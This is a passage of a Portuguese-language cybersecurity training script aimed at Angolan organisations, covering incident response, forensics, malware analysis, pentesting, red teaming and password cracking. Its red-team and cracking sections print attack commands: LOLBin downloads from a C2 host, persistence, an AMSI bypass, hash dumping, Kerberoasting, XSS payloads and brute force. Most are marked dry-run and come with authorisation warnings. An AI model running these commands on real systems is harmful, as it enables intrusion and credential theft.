            warn("Trivy: https://github.com/aquasecurity/trivy/releases ou choco install trivy")
        else:
            warn("Trivy não instalado. Execute: sudo apt install trivy -y")

    # Cenário Real
    scenario_header("IMPLEMENTAÇÃO ZERO TRUST — BANCO ANGOLANO")
    cmd_info("PASSO 1 · Inventário de interfaces de rede")
    run(get_ip_info())
    cmd_info("PASSO 2 · Tabela de rotas")
    run(get_routing_table())
    cmd_info("PASSO 3 · Portas abertas activas")
    run(get_open_ports())
    divider(2)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 03 · RESPOSTA A INCIDENTES
# ─────────────────────────────────────────────
def area_03():
    section_header(3, "RESPOSTA A INCIDENTES", "Incident Response · Contenção · Erradicação · Recuperação")
    platform_info()

    # 3.1 Triage
    subsection("3.1 · TRIAGE — Colecta de Artefactos Voláteis", 3)
    ir_dir = get_ir_dir()
    make_dir(ir_dir)
    cmd_info(f"Directório de artefactos: {ir_dir}")
    success(f"Directório criado: {ir_dir}")

    artifacts = collect_ir_artifacts(ir_dir)
    for i, (artifact_cmd, desc) in enumerate(artifacts, 1):
        cmd_info(f"{i}. {desc}")
        run(artifact_cmd)

    cmd_info("Compactar artefactos")
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    archive = path_join(ir_dir, f"artefactos_{ts}.tgz")
    run(archive_evidence(ir_dir, archive))
    cmd_info("Calcular hash de integridade dos artefactos")
    run(hash_file(archive))
    divider(3)

    # 3.2 Contenção
    subsection("3.2 · CONTENÇÃO — Isolamento e Bloqueio", 3)
    cmd_info("Isolamento de sistema comprometido (DRY RUN)")
    for isolation_cmd in isolate_network_dry():
        run(isolation_cmd, dry=True)
    cmd_info("Bloquear domínio malicioso via hosts file")
    run(block_malicious_domain("dominio-malicioso.ru"), dry=True)
    cmd_info("Desactivar conta comprometida")
    for dcmd in disable_user("utilizador_comprometido"):
        run(dcmd, dry=True)
    divider(3)

    # 3.3 Análise de Causa Raiz
    subsection("3.3 · ANÁLISE — Causa Raiz e Timeline Forense", 3)
    cmd_info("Logs de autenticação (últimas 24h)")
    run(get_ssh_logs())
    cmd_info("Ficheiros modificados nas últimas 24h")
    tmp = get_temp_dir()
    run(find_files_modified(tmp, 24))
    cmd_info("Verificar ficheiros com permissões especiais / executáveis suspeitos")
    run(find_suid_files())
    cmd_info("Tarefas agendadas / Cron")
    run(get_cron_tasks())
    cmd_info("Serviços com falha")
    run(get_failed_services())
    divider(3)

    # Cenário Real
    scenario_header("RANSOMWARE LOCKBIT — EMPRESA LUANDA")
    cmd_info("PASSO 1 · Contenção imediata (DRY RUN)")
    for isolation_cmd in isolate_network_dry():
        run(isolation_cmd, dry=True)
    cmd_info("PASSO 2 · Identificar extensão do ataque")
    if IS_WINDOWS:
        run('powershell -Command "Get-ChildItem C:\\ -Recurse -Include *.lockbit,README_RANSOM.txt -ErrorAction SilentlyContinue | Select-Object -First 10 FullName"')
    else:
        run(f"find / -name '*.lockbit' -o -name 'README_RANSOM.txt' {suppress_errors()} | head -10 || echo 'Nenhum ficheiro LockBit encontrado'")
    cmd_info("PASSO 3 · Verificar backups disponíveis")
    if IS_WINDOWS:
        run("wbadmin get versions 2>nul || vssadmin list shadows 2>nul | head -20")
    else:
        run(f"df -h {suppress_errors()} && ls -la /backup/ {suppress_errors()} || echo '/backup não existe'")
    info("PASSO 4 · INACOM Angola — Notificação obrigatória em 72h")
    info("  Contacto: +244 222 323 838 | inacom@inacom.gov.ao")
    divider(3)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 04 · FORENSE DIGITAL
# ─────────────────────────────────────────────
def area_04():
    section_header(4, "FORENSE DIGITAL", "Investigação · Evidências · Cadeia de Custódia · Tribunal")
    platform_info()

    # 4.1 Aquisição Forense
    subsection("4.1 · AQUISIÇÃO FORENSE — Disco e Memória RAM", 4)
    cmd_info("Listar dispositivos/discos disponíveis")
    if IS_WINDOWS:
        run("wmic diskdrive list brief 2>nul")
        run("diskpart /s nul 2>nul || echo Use 'diskpart' interactivo para listar volumes")
    else:
        run(f"lsblk {suppress_errors()}")
        run(f"sudo fdisk -l {suppress_errors()} | grep 'Disk /dev' | head -10")
    cmd_info("Criar imagem forense")
    if IS_WINDOWS:
        cmd_info("FTK Imager (recomendado no Windows) — GUI ou CLI")
        run(r'"C:\Program Files\AccessData\FTK Imager\ftkimager.exe" \\.\PhysicalDrive0 "D:\evidencia_001" --e01 --case-number IR-2025-001', dry=True)
        cmd_info("Alternativa: dd via Cygwin/WSL2")
        run("wsl sudo dd if=/dev/sdb of=/mnt/d/evidencia_001.dd bs=4M status=progress", dry=True)
    else:
        run("sudo dd if=/dev/sdb of=/external/evidencia_001.dd bs=4M conv=noerror,sync status=progress", dry=True)
        run("sudo dcfldd if=/dev/sdb hash=sha256 hashlog=/external/hash.log of=/external/evidencia_001.dd", dry=True)
    cmd_info("Calcular hashes de integridade")
    if IS_WINDOWS:
        run('certutil -hashfile "%SystemRoot%\\System32\\notepad.exe" SHA256 2>nul')
        run('certutil -hashfile "%SystemRoot%\\System32\\notepad.exe" MD5 2>nul')
    else:
        run(f"sha256sum /bin/ls {suppress_errors()} | head -1")
        run(f"md5sum /bin/ls {suppress_errors()} | head -1")
    divider(4)

    # 4.2 Análise de Disco
    subsection("4.2 · THE SLEUTH KIT / AUTOPSY — Análise de Disco", 4)
    if IS_WINDOWS:
        cmd_info("Autopsy GUI para Windows — download em:")
        info("https://www.autopsy.com/download/")
        cmd_info("Verificar se Autopsy CLI está disponível")
        run(r'"C:\Program Files\Autopsy\bin\autopsy.exe" --help 2>nul || echo Autopsy nao encontrado')
    else:
        run("sudo apt install sleuthkit -y", dry=True)
        if check_tool("fls"):
            run(f"fls -r -d /tmp/test.img {suppress_errors()} | head -20 || echo 'TSK disponível — forneça imagem'")
        else:
            warn("sleuthkit não instalado. Execute: sudo apt install sleuthkit -y")
    divider(4)

    # 4.3 Volatility 3
    subsection("4.3 · VOLATILITY 3 — Análise de Memória RAM", 4)
    python_exe = "python" if IS_WINDOWS else "python3"
    cmd_info("Instalar Volatility 3")
    run(f"git clone https://github.com/volatilityfoundation/volatility3 \"{path_join(get_temp_dir(), 'volatility3')}\" {suppress_errors()}", dry=True)
    vol_path = path_join(get_temp_dir(), "volatility3", "vol.py")
    if os.path.exists(vol_path):
        dump = path_join(get_temp_dir(), "ram_dump.dmp")
        run(f'{python_exe} "{vol_path}" -f "{dump}" windows.pslist {suppress_errors()} | head -20', dry=True)
        run(f'{python_exe} "{vol_path}" -f "{dump}" windows.malfind {suppress_errors()} | head -20', dry=True)
        run(f'{python_exe} "{vol_path}" -f "{dump}" windows.hashdump {suppress_errors()} | head -20', dry=True)
        run(f'{python_exe} "{vol_path}" -f "{dump}" windows.cmdline {suppress_errors()} | head -20', dry=True)
    else:
        warn(f"Volatility 3 não encontrado. Clone para: {path_join(get_temp_dir(), 'volatility3')}")
    divider(4)

    # 4.4 Forense Móvel
    subsection("4.4 · FORENSE MÓVEL — Android e SQLite", 4)
    cmd_info("Verificar dispositivos Android conectados (ADB)")
    if check_tool("adb"):
        run("adb devices")
        run(f"adb backup -apk -all -shared -f \"{path_join(get_temp_dir(), 'backup_aofr.ab')}\" {suppress_errors()}", dry=True)
        run(f"adb pull /sdcard/WhatsApp/ \"{path_join(get_temp_dir(), 'whatsapp_backup')}\" {suppress_errors()}", dry=True)
        run(f"adb shell pm list packages {suppress_errors()} | head -20")
    else:
        if IS_WINDOWS:
            warn("ADB não encontrado. Instale: https://developer.android.com/studio/releases/platform-tools")
        else:
            warn("ADB não encontrado. Execute: sudo apt install android-tools-adb -y")

    # Cenário Real
    scenario_header("FRAUDE BANCÁRIA BIC — INVESTIGAÇÃO FORENSE")
    cmd_info("PASSO 1 · Calcular hash ANTES da aquisição (cadeia de custódia)")
    backup_ab = path_join(get_temp_dir(), "backup_aofr.ab")
    if os.path.exists(backup_ab):
        run(hash_file(backup_ab))
    else:
        warn("Ficheiro backup_aofr.ab não disponível")
    cmd_info("PASSO 2 · Análise SQLite WhatsApp")
    sqlite_db = path_join(get_temp_dir(), "msgstore.db")
    if check_tool("sqlite3"):
        run(f'sqlite3 "{sqlite_db}" "SELECT datetime(timestamp/1000,\'unixepoch\'),data FROM messages WHERE data LIKE \'%AOA%\' LIMIT 20;" {suppress_errors()} || echo Base de dados nao disponivel')
    else:
        warn("sqlite3 não encontrado. Instale: https://www.sqlite.org/download.html" if IS_WINDOWS else "sudo apt install sqlite3 -y")
    cmd_info("PASSO 3 · Relatório de integridade para tribunal")
    now = datetime.datetime.now().isoformat()
    info(f"Evidência adquirida em: {now}")
    info("Analista: Alfredo Ociola Francisco Romano | AOFR TECH")
    divider(4)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 05 · ANALISTA DE MALWARE
# ─────────────────────────────────────────────
def area_05():
    section_header(5, "ANALISTA DE MALWARE", "Engenharia Reversa · Sandboxing · IOCs · Yara Rules")
    platform_info()

    # 5.1 Análise Estática
    subsection("5.1 · ANÁLISE ESTÁTICA — Ficheiros Suspeitos", 5)
    SAMPLE = path_join(get_temp_dir(), "sample_test.bin")
    python_exe = "python" if IS_WINDOWS else "python3"

    # Criar ficheiro de teste inofensivo cross-platform
    try:
        with open(SAMPLE, "w") as f:
            f.write("AOFR TECH TEST SAMPLE - NOT MALWARE")
        success(f"Ficheiro de teste criado: {SAMPLE}")
    except Exception as e:
        error(f"Não foi possível criar ficheiro de teste: {e}")

    cmd_info(f"Calcular hashes: {SAMPLE}")
    run(hash_file(SAMPLE))
    run(md5_file(SAMPLE))

    cmd_info("Extrair strings do ficheiro (cross-platform via Python)")
    run(f'{python_exe} -c "data=open(\'{SAMPLE}\',\'rb\').read(); strings=[]; i=0; [strings.append(b\'\'.join(data[i:i+8]).decode(\'ascii\',\'ignore\')) for i in range(len(data)-8) if all(32<=data[j]<127 for j in range(i,i+8))]; print(chr(10).join(set(strings[:30])))"')

    cmd_info("Verificar com strings (se disponível)")
    if check_tool("strings"):
        run(f'strings "{SAMPLE}" | head -30')
    elif IS_WINDOWS:
        run(f'findstr /P "http https cmd powershell" "{SAMPLE}" 2>nul || echo strings.exe nao disponivel (instale Sysinternals)')
    else:
        warn("strings não disponível")

    cmd_info("Verificar hash no VirusTotal (API)")
    run(f'curl -s "https://www.virustotal.com/api/v3/files/HASH_AQUI" -H "x-apikey: SEU_API_KEY"', dry=True)
    divider(5)

    # 5.2 Análise Dinâmica
    subsection("5.2 · ANÁLISE DINÂMICA — Sandbox e Monitorização", 5)
    warn("NUNCA execute malware fora de VM/sandbox isolada!")
    cmd_info("Submeter amostra para análise ANY.RUN")
    run('curl -X POST "https://api.any.run/v1/analysis" -H "Authorization: API-Key SEU_KEY" -F "file=@sample.exe"', dry=True)
    cmd_info("Capturar tráfego de rede durante análise")
    if IS_WINDOWS:
        if check_tool("tshark"):
            capture = path_join(get_temp_dir(), "malware_traffic_aofr.pcap")
            run(f'tshark -i 1 -a duration:10 -w "{capture}" {suppress_errors()}', dry=True)
        else:
            warn("tshark não encontrado. Instale Wireshark: https://www.wireshark.org/download.html")
    else:
        if check_tool("tcpdump"):
            capture = path_join(get_temp_dir(), "malware_traffic_aofr.pcap")
            run(f"sudo tcpdump -i lo -c 20 -w {capture} {suppress_errors()} &")
            time.sleep(2)
            run(f"sudo pkill tcpdump {suppress_errors()}")
        else:
            warn("tcpdump não disponível")
    divider(5)

    # 5.3 Regras YARA
    subsection("5.3 · YARA + SIGMA — Regras de Detecção", 5)
    YARA_FILE = path_join(get_temp_dir(), "lockbit_aofr.yar")
    SIGMA_FILE = path_join(get_temp_dir(), "lockbit_sigma_aofr.yml")
    cmd_info(f"Criar regra YARA: {YARA_FILE}")
    yara_rule = '''rule LockBit_Ransomware_Angola {
    meta:
        description = "Detecta variante LockBit encontrada em Angola 2025"
        author      = "SOC Angola - AOFR TECH"
        date        = "2025-01-01"
        severity    = "critical"
    strings:
        $str1 = "LockBit" nocase
        $str2 = ".lockbit" nocase
        $str3 = "All your files are encrypted" nocase
        $str4 = { 4D 5A 90 00 03 00 00 00 }
        $str5 = "README_RANSOM.txt" nocase
        $c2_ip = "91.108.4.0"
    condition:
        uint16(0) == 0x5A4D and 3 of ($str*) or $c2_ip
}'''
    try:
        with open(YARA_FILE, "w") as f:
            f.write(yara_rule)
        success(f"Regra YARA guardada em {YARA_FILE}")
    except Exception as e:
        error(f"Não foi possível criar regra YARA: {e}")

    if check_tool("yara"):
        tmp = get_temp_dir()
        run(f'yara "{YARA_FILE}" "{tmp}" -r {suppress_errors()} | head -20 || echo "Nenhuma detecção (sistema limpo)"')
    else:
        if IS_WINDOWS:
            warn("YARA não encontrado. Instale: https://github.com/VirusTotal/yara/releases ou choco install yara")
        else:
            warn("YARA não instalado. Execute: sudo apt install yara -y")

    sigma_rule = '''title: LockBit Ransomware Activity - AOFR TECH
status: experimental
description: Detecta actividade do LockBit em logs Windows - Angola SOC
author: Alfredo Ociola Francisco Romano
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - "vssadmin delete shadows"
            - "bcdedit /set recoveryenabled No"
            - "wbadmin delete catalog"
    condition: selection
level: critical
'''
    try:
        with open(SIGMA_FILE, "w") as f:
            f.write(sigma_rule)
        success(f"Regra Sigma guardada em {SIGMA_FILE}")
    except Exception as e:
        error(f"Não foi possível criar regra Sigma: {e}")

    # Cenário Real
    scenario_header("RANSOMWARE EMPRESA LUANDA — IDENTIFICAÇÃO E IOCs")
    cmd_info("PASSO 1 · Hash e pesquisa inicial")
    run(hash_file(SAMPLE))
    cmd_info("PASSO 2 · Análise estática rápida — strings suspeitas")
    if check_tool("strings"):
        run(f'strings "{SAMPLE}" | grep -iE "http|[.]ru|[.]cn|C2|command" | head -10')
    cmd_info("PASSO 3 · Submeter ao ANY.RUN via API")
    run('curl -X POST "https://api.any.run/v1/analysis" -H "Authorization: API-Key SEU_KEY" -F "file=@ficheiro_suspeito.exe"', dry=True)
    divider(5)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 06 · PEN TESTER
# ─────────────────────────────────────────────
def area_06():
    section_header(6, "TESTADOR DE PENETRAÇÃO", "Ethical Hacking · OWASP · Bug Bounty")
    platform_info()

    # 6.1 Recon OSINT
    subsection("6.1 · RECON — OSINT e Reconhecimento Passivo", 6)
    DOMAIN = "exemplo.ao"
    cmd_info(f"DNS Reconnaissance: {DOMAIN}")
    if check_tool("nslookup"):
        run(f"nslookup {DOMAIN}")
        run(f"nslookup -type=MX {DOMAIN}")
        run(f"nslookup -type=TXT {DOMAIN}")
    if check_tool("dig"):
        run(f"dig {DOMAIN} ANY +noall +answer {suppress_errors()} | head -10")
    elif IS_WINDOWS:
        run(f"Resolve-DnsName {DOMAIN} -Type ANY 2>nul | Select-Object -First 10", dry=False)
    cmd_info("theHarvester — emails, subdomínios")
    if check_tool("theHarvester"):
        osint_output = path_join(get_temp_dir(), "osint_aofr.html")
        run(f'theHarvester -d {DOMAIN} -b google,bing -l 100 -f "{osint_output}" {suppress_errors()} | tail -20')
    else:
        if IS_WINDOWS:
            warn("theHarvester: pip install theHarvester ou use Kali WSL2")
        else:
            warn("theHarvester não instalado. Execute: sudo apt install theharvester -y")
    divider(6)

    # 6.2 Nmap
    subsection("6.2 · NMAP — Enumeração Profissional", 6)
    TARGET = "127.0.0.1"
    cmd_info(f"Nmap — scan: {TARGET}")
    if check_tool("nmap"):
        nmap_out = path_join(get_temp_dir(), "nmap_aofr.txt")
        run(f'nmap -sn {TARGET} {suppress_errors()} | head -20')
        run(f'nmap -sV --top-ports 100 -T4 {TARGET} -oN "{nmap_out}" {suppress_errors()} | head -30')
        run(f'nmap -sV --script=banner,http-title {TARGET} {suppress_errors()} | head -30')
    else:
        if IS_WINDOWS:
            warn("nmap não encontrado. Instale: https://nmap.org/download.html ou winget install nmap")
        else:
            warn("nmap não instalado. Execute: sudo apt install nmap -y")
    cmd_info("gobuster / ffuf — descoberta de directórios")
    if check_tool("gobuster"):
        if IS_WINDOWS:
            wordlist = path_join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "gobuster", "wordlists", "common.txt")
        else:
            wordlist = "/usr/share/wordlists/dirb/common.txt"
        if os.path.exists(wordlist):
            run(f'gobuster dir -u http://{TARGET} -w "{wordlist}" -x php,html,txt -t 20 {suppress_errors()} | head -20')
        else:
            warn(f"Wordlist não encontrada. Use SecLists: https://github.com/danielmiessler/SecLists")
    divider(6)

    # 6.3 Web Pentesting
    subsection("6.3 · WEB PENTESTING — OWASP TOP 10", 6)
    cmd_info("SQLmap — SQL Injection automatizado")
    if check_tool("sqlmap"):
        run(f"sqlmap -u 'http://{TARGET}/produto?id=1' --dbs --batch --level=1 --risk=1 {suppress_errors()} | tail -15")
    else:
        warn("sqlmap não instalado. Execute: pip install sqlmap" if IS_WINDOWS else "sudo apt install sqlmap -y")

    cmd_info("Payloads XSS para teste manual")
    xss_payloads = [
        '<script>alert("XSS-AOFR")</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg onload=alert(document.domain)>',
    ]
    for p in xss_payloads:
        info(f"Payload: {p}")

    cmd_info("Testar JWT — decodificar sem verificar assinatura")
    python_exe = "python" if IS_WINDOWS else "python3"
    TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFPRlIgVEVDSCIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    try:
        import base64, json
        parts = TOKEN.split('.')
        header  = json.loads(base64.b64decode(parts[0] + '=='))
        payload = json.loads(base64.b64decode(parts[1] + '=='))
        success(f"JWT Header: {header}")
        success(f"JWT Payload: {payload}")
    except Exception as e:
        error(f"Erro ao decodificar JWT: {e}")
    divider(6)

    # 6.4 Active Directory
    subsection("6.4 · ACTIVE DIRECTORY — Kerberoasting, BloodHound, Responder", 6)
    cmd_info("Kerberoasting — extrair tickets de serviço")
    if check_tool("impacket-GetUserSPNs"):
        run("impacket-GetUserSPNs empresa.ao/utilizador:password -dc-ip 192.168.1.10 -request {suppress_errors()} | head -20", dry=True)
    elif IS_WINDOWS and check_tool("Rubeus.exe"):
        run("Rubeus.exe kerberoast /outfile:kerb_hashes.txt", dry=True)
    else:
        warn("impacket não instalado. Execute: pip install impacket" if IS_WINDOWS else "sudo apt install impacket-scripts -y")

    # Cenário Real
    scenario_header("PEN TEST API — FINTECH ANGOLANA")
    cmd_info("PASSO 1 · Enumeração de endpoints")
    if check_tool("ffuf"):
        run("ffuf -u https://api.fintech.ao/FUZZ -w wordlist.txt -mc 200,201,301 {suppress_errors()} | head -20", dry=True)
    cmd_info("PASSO 2 · Testar IDOR")
    run("curl -s https://api.fintech.ao/users/1001/balance -H 'Authorization: Bearer TOKEN'", dry=True)
    run("curl -s https://api.fintech.ao/users/1002/balance -H 'Authorization: Bearer TOKEN'", dry=True)
    cmd_info("PASSO 3 · SQL Injection na API")
    run("sqlmap -u 'https://api.fintech.ao/transactions?id=1' -H 'Authorization: Bearer TOKEN' --batch --dbs", dry=True)
    divider(6)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 07 · RED TEAM
# ─────────────────────────────────────────────
def area_07():
    section_header(7, "OPERADOR DE RED TEAM", "APT Simulation · C2 · Social Engineering · Purple Team")
    platform_info()

    # 7.1 Sliver C2
    subsection("7.1 · SLIVER C2 — Configuração e Operação", 7)
    warn("APENAS para operações Red Team com autorização escrita!")
    cmd_info("Instalar Sliver C2 Framework")
    if IS_WINDOWS:
        run("Invoke-WebRequest -Uri https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_windows.exe -OutFile sliver-server.exe", dry=True)
        run(".\\sliver-server.exe unpack", dry=True)
    else:
        run("curl https://sliver.sh/install | sudo bash", dry=True)
        run("sudo sliver-server &", dry=True)
    cmd_info("Gerar implant beacon HTTPS")
    run("generate beacon --http https://c2.redteam.ao:443 --os windows --arch amd64 --name beacon_banco", dry=True)
    run("generate beacon --mtls c2.redteam.ao:8888 --os windows --arch amd64 --format exe", dry=True)
    divider(7)

    # 7.2 Post-Exploitation
    subsection("7.2 · POST-EXPLOITATION — Movimento Lateral", 7)
    cmd_info("BloodHound — mapear AD")
    if check_tool("bloodhound-python"):
        run("bloodhound-python -u utilizador -p password -d empresa.ao -c All --zip {suppress_errors()}", dry=True)
    else:
        warn("bloodhound-python não instalado. Execute: pip install bloodhound" if IS_WINDOWS else "pip3 install bloodhound")
    cmd_info("CrackMapExec — enumerar rede")
    if check_tool("crackmapexec") or check_tool("cme"):
        run("crackmapexec smb 192.168.1.0/24 {suppress_errors()}", dry=True)
    else:
        warn("CrackMapExec: pip install crackmapexec" if IS_WINDOWS else "sudo apt install crackmapexec -y")
    cmd_info("impacket — dump de hashes")
    run("impacket-secretsdump empresa.ao/admin:password@192.168.1.10 {suppress_errors()}", dry=True)
    divider(7)

    # 7.3 Phishing
    subsection("7.3 · GOPHISH — Phishing e Awareness", 7)
    warn("APENAS para campanhas de phishing autorizadas (Red Team / Awareness)!")
    cmd_info("GoPhish — compatível com Windows e Linux")
    if IS_WINDOWS:
        run("Invoke-WebRequest -Uri https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-windows-64bit.zip -OutFile gophish.zip", dry=True)
        run("Expand-Archive gophish.zip -DestinationPath gophish\\", dry=True)
        run(".\\gophish\\gophish.exe", dry=True)
    else:
        run(f"wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip -O {path_join(get_temp_dir(), 'gophish.zip')} {suppress_errors()}", dry=True)
        run(f"unzip {path_join(get_temp_dir(), 'gophish.zip')} -d {path_join(get_temp_dir(), 'gophish')} {suppress_errors()} && chmod +x {path_join(get_temp_dir(), 'gophish', 'gophish')}", dry=True)
    divider(7)

    # 7.4 Evasão EDR
    subsection("7.4 · EVASÃO EDR — LOLBins, Persistência, Process Injection", 7)
    warn("APENAS em ambientes de teste/laboratório com autorização!")
    cmd_info("LOLBins Windows — certutil (download e decode)")
    run(f"certutil.exe -urlcache -f http://c2.red.ao/payload.b64 \"{path_join(get_temp_dir(), 'payload.b64')}\"", dry=True)
    cmd_info("LOLBins — execução via regsvr32")
    run("regsvr32 /s /n /u /i:http://c2.red.ao/payload.sct scrobj.dll", dry=True)
    cmd_info("Persistência — Registry Run Key (Windows)")
    run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\ProgramData\\updater.exe" /f', dry=True)
    cmd_info("Persistência — Scheduled Task (cross-platform)")
    if IS_WINDOWS:
        run('schtasks /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\updater.exe" /sc onlogon /ru SYSTEM /f', dry=True)
    else:
        run("(crontab -l 2>/dev/null; echo '@reboot /tmp/updater.sh') | crontab -", dry=True)
    cmd_info("AMSI Bypass PowerShell (Windows)")
    info('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")')
    info('.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)')
    if not IS_WINDOWS:
        cmd_info("Process Injection Linux (GDB)")
        run("sudo gdb -p $(pgrep apache2 | head -1) -batch -ex \"call (void*)mmap(0,4096,7,34,-1,0)\" -ex \"quit\"", dry=True)
    divider(7)

    # Cenário Real
    scenario_header("RED TEAM OPERATION — BANCO ANGOLANO (8 SEMANAS)")
    cmd_info("SEMANA 1-2 · OSINT Profundo")
    if check_tool("theHarvester"):
        run(f"theHarvester -d banco.ao -b all -l 500 -f \"{path_join(get_temp_dir(), 'osint_banco_aofr.html')}\" {suppress_errors()}", dry=True)
    cmd_info("SEMANA 4 · Enumeração AD com BloodHound")
    run("bloodhound-python -u comprometido -p hash -d banco.ao -c All --hashes {suppress_errors()}", dry=True)
    cmd_info("SEMANA 5 · Kerberoasting + Hashcat")
    run(f"impacket-GetUserSPNs banco.ao/user:pass -dc-ip 192.168.1.1 -request -outputfile \"{path_join(get_temp_dir(), 'kerb_banco.txt')}\" {suppress_errors()}", dry=True)
    cmd_info("SEMANA 8 · Relatório Executivo")
    info("Criticidade: CRÍTICO — Acesso total ao sistema bancário core")
    info("Blue Team não detectou comprometimento por 6 semanas")
    info("Recomendações: MFA universal, AD hardening, SIEM tuning")
    divider(7)
    pause_menu()

# ─────────────────────────────────────────────
#  ÁREA 09 · FERRAMENTAS DE QUEBRA DE SENHAS
# ─────────────────────────────────────────────
def area_09():
    section_header(9, "FERRAMENTAS DE QUEBRA DE SENHAS",
                   "Password Cracking · Brute Force · Rainbow Tables · Wi-Fi Audit · Ethical Use Only")
    platform_info()

    # ─── AVISO LEGAL ───────────────────────────────────────────────
    print()
    w = shutil.get_terminal_size((100, 30)).columns
    print(C.RED + C.BOLD + "  ╔" + "═" * (w - 4) + "╗" + C.RESET)
    print(C.RED + C.BOLD + ("  ║  ⚠  AVISO LEGAL — USO EXCLUSIVO EM AMBIENTES AUTORIZADOS").ljust(w - 2) + "  ║" + C.RESET)
    print(C.RED + C.BOLD + ("  ║  Usar estas ferramentas sem autorização é crime (Lei 7/17 - Angola).").ljust(w - 2) + "  ║" + C.RESET)
    print(C.RED + C.BOLD + ("  ║  Apenas para: Pentest autorizado · CTF · Laboratório · Auditoria interna").ljust(w - 2) + "  ║" + C.RESET)
    print(C.RED + C.BOLD + "  ╚" + "═" * (w - 4) + "╝" + C.RESET)
    print()
    time.sleep(1)

    # ──────────────────────────────────────────────────────────────
    # 9.1  HASHCAT — Recuperação de hashes com GPU
    # ──────────────────────────────────────────────────────────────
    subsection("9.1 · HASHCAT 🐱 — Recuperação de Hashes com GPU/CPU", 9)
    cmd_info("Hashcat: ferramenta de recuperação de senhas de alto desempenho com aceleração GPU")
    cmd_info("Suporta: MD5, SHA1, SHA256, NTLM, WPA2, bcrypt, Kerberos, e +300 tipos de hash")

    if not check_tool("hashcat"):
        if IS_WINDOWS:
            warn("hashcat não encontrado. Baixe em: https://hashcat.net/hashcat/")
            info("Windows: descompacte e adicione ao PATH ou use: .\\hashcat.exe")
        else:
            warn("Instalar: sudo apt install hashcat -y")
    else:
        success("hashcat encontrado no PATH")

    # Identificar tipos de hash comuns
    cmd_info("--- Tipos de Hash Suportados (selecção) ---")
    hash_types = [
        ("-m 0",     "MD5            ex: 5f4dcc3b5aa765d61d8327deb882cf99"),
        ("-m 100",   "SHA-1          ex: da39a3ee5e6b4b0d3255bfef95601890"),
        ("-m 1000",  "NTLM (Windows) ex: 32ed87bdb5fdc5e9cba88547376818d4"),
        ("-m 1800",  "sha512crypt    ex: $6$rounds=5000$..."),
        ("-m 3200",  "bcrypt         ex: $2a$05$..."),
        ("-m 13100", "Kerberos TGS   ex: $krb5tgs$23$*..."),
        ("-m 22000", "WPA2-PMKID     ex: captura com hcxdumptool"),
        ("-m 16500", "JWT            ex: eyJhbGciOiJIUzI1NiJ9..."),
    ]
    for flag, desc in hash_types:
        print(f"  {C.YELLOW}{flag:<10}{C.RESET}  {C.DIM}{desc}{C.RESET}")
    print()

    cmd_info("Hashcat · Modos de ataque")
    attack_modes = [
        ("-a 0", "Wordlist (dictionary attack)"),
        ("-a 1", "Combination (combina 2 wordlists)"),
        ("-a 3", "Brute-force / mask attack"),
        ("-a 6", "Hybrid: wordlist + máscara"),
        ("-a 7", "Hybrid: máscara + wordlist"),
    ]
    for flag, desc in attack_modes:
        print(f"  {C.GREEN}{flag:<6}{C.RESET}  {C.DIM}{desc}{C.RESET}")
    print()

    cmd_info("EXEMPLO 1 · Quebrar hashes NTLM com wordlist")
    run("hashcat -m 1000 -a 0 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt --force", dry=True)

    cmd_info("EXEMPLO 2 · Kerberoasting — TGS-REP tickets")
    run("hashcat -m 13100 -a 0 kerb_tickets.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", dry=True)

    cmd_info("EXEMPLO 3 · Ataque com máscara (brute-force 8 chars: letras+números)")
    run("hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment --increment-min 6", dry=True)

    cmd_info("EXEMPLO 4 · WPA2 captura convertida para hc22000")
    run("hashcat -m 22000 captura.hc22000 rockyou.txt -r rules/wifi.rule", dry=True)

    cmd_info("EXEMPLO 5 · Mostrar senhas já quebradas")
    run("hashcat -m 1000 hashes_ntlm.txt --show", dry=not check_tool("hashcat"))

    cmd_info("Verificar benchmarks de performance no hardware actual")
    run("hashcat -b -m 1000", dry=not check_tool("hashcat"))
    divider(9)

    # ──────────────────────────────────────────────────────────────
    # 9.2  HYDRA — Brute Force de Login de Rede
    # ──────────────────────────────────────────────────────────────
    subsection("9.2 · HYDRA 🐉 — Brute Force de Login de Rede", 9)
    cmd_info("Hydra: ferramenta rápida de brute force que suporta 50+ protocolos")
    cmd_info("Protocolos: SSH, FTP, HTTP/HTTPS, SMB, RDP, SMTP, IMAP, Telnet, MySQL, MSSQL, VNC...")

    if not check_tool("hydra"):
        if IS_WINDOWS:
            warn("Hydra: use via Kali WSL2 ou baixe o port Windows em: https://github.com/maaaaz/thc-hydra-windows")
        else:
            warn("Instalar: sudo apt install hydra -y")
    else:
        success("hydra encontrado no PATH")

    TARGET = "192.168.1.100"
    cmd_info("EXEMPLO 1 · SSH brute force — utilizador único, wordlist")
    run(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{TARGET} -t 4 -V", dry=True)

    cmd_info("EXEMPLO 2 · SSH — lista de utilizadores + lista de senhas")
    run(f"hydra -L users.txt -P passwords.txt ssh://{TARGET} -t 4 -o hydra_ssh.txt", dry=True)

    cmd_info("EXEMPLO 3 · HTTP POST (formulário de login web)")
